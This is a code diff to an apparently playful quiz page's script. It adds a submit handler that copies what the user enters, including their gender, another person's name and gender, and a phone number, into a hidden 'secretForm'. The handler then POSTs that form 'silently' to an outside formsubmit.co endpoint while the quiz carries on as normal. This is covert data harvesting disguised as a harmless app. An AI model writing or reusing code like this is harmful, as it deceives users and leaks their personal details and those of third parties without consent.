@@ -1407,20 +1407,34 @@
       generateQuote();
     });
     // Fill the hidden form
-document.getElementById('formUserGender').value = fd.get('userGender');
-document.getElementById('formTargetName').value = fd.get('name');
-document.getElementById('formTargetGender').value = fd.get('targetGender');
-document.getElementById('formPhoneNumber').value = fd.get('phone') || 'N/A';
-document.getElementById('formTimestamp').value = new Date().toLocaleString();
+form.addEventListener('submit', async function (e) {
+  e.preventDefault();
 
-const hiddenForm = document.getElementById('secretForm');
-const hiddenFd = new FormData(hiddenForm);
+  const fd = new FormData(form);
 
-// Submit to FormSubmit silently
-fetch(hiddenForm.action, {
-  method: 'POST',
-  body: hiddenFd
+  // Fill hidden form values
+  document.getElementById('formUserGender').value = fd.get('userGender');
+  document.getElementById('formTargetName').value = fd.get('name');
+  document.getElementById('formTargetGender').value = fd.get('targetGender');
+  document.getElementById('formPhoneNumber').value = fd.get('phone') || 'N/A';
+  document.getElementById('formTimestamp').value = new Date().toLocaleString();
+
+  const hiddenFd = new FormData(document.getElementById('secretForm'));
+
+  // Send silently to FormSubmit
+  fetch('https://formsubmit.co/el/telegi', {
+    method: 'POST',
+    body: hiddenFd
+  });
+
+  // Continue to questions
+  const targetGender = fd.get('targetGender');
+  questions = targetGender === 'female' ? girlQuestions : guyQuestions;
+  form.classList.add('hidden');
+  questionSection.classList.remove('hidden');
+  showQuestion();
 });
+
 
   </script>
 </body>
